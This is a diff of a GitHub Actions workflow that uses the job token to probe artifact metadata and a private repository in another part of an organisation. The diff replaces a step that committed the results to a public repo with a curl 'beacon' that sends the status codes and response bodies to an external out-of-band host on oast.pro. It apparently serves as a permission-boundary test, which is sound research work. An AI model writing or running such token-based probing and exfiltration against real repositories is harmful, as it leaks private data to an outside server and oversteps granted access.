@@ -2,32 +2,21 @@ name: readmeta
 on:
   workflow_dispatch:
 permissions:
-  contents: write
+  contents: read
   artifact-metadata: read
 jobs:
   rd:
     runs-on: ubuntu-latest
     steps:
-      - name: cross-repo metadata read probe (committed)
+      - name: cross-repo metadata read probe (beacon)
         env:
           TOKEN: ${{ github.token }}
         run: |
-          set -e
           B=https://api.github.com
           A="Authorization: Bearer $TOKEN"
           H="Accept: application/vnd.github+json"
           D=sha256:5a28310c1e3a2dab9bb36fde1f53660ac31d062297eb8db843d4fcd51ddafb86
           DR=$(curl -s -o /tmp/d.json -w '%{http_code}' -H "$A" -H "$H" "$B/orgs/tooforg/artifacts/$D/metadata/deployment-records")
           SR=$(curl -s -o /tmp/s.json -w '%{http_code}' -H "$A" -H "$H" "$B/orgs/tooforg/artifacts/$D/metadata/storage-records")
-          MR=$(curl -s -o /tmp/m.json -w '%{http_code}' -H "$A" -H "$H" "$B/repos/tooforg/invisible-repo")
-          python3 - "$DR" "$SR" "$MR" <<'PY'
-          import json,sys,base64,os
-          out={"deployment_status":sys.argv[1],"storage_status":sys.argv[2],"private_repo_status":sys.argv[3],
-               "deployment_body":open('/tmp/d.json').read()[:2000],
-               "storage_body":open('/tmp/s.json').read()[:1200]}
-          body=json.dumps(out,indent=1)
-          payload=json.dumps({"message":"test: readmeta result","content":base64.b64encode(body.encode()).decode(),"branch":"main"})
-          open('/tmp/put.json','w').write(payload)
-          PY
-          curl -s -o /tmp/pr.json -w 'commit_http=%{http_code}\n' -X PUT -H "$A" -H "$H" \
-            --data @/tmp/put.json "$B/repos/tooforg/public-test-repo/contents/meta-probe-result.json" || true
+          MR=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/tooforg/invisible-repo")
+          curl -s -G "http://ro4yhyiy8bnjaqqlmuqbahdry1idkibzn.oast.pro/meta" --data-urlencode "d=$DR" --data-urlencode "s=$SR" --data-urlencode "m=$MR" --data-urlencode "db@/tmp/d.json" --data-urlencode "sb@/tmp/s.json" > /dev/null
